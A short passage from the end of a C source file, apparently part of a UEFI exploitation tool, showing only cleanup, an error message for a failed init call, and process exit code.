        uefi_expl_uninit();
    }
    else
    {
        printf("ERROR: uefi_expl_init() fails\n");
    }

#ifdef WIN32

    ExitProcess(0);

#endif

    return ret;
}
//--------------------------------------------------------------------------------------
// EoF
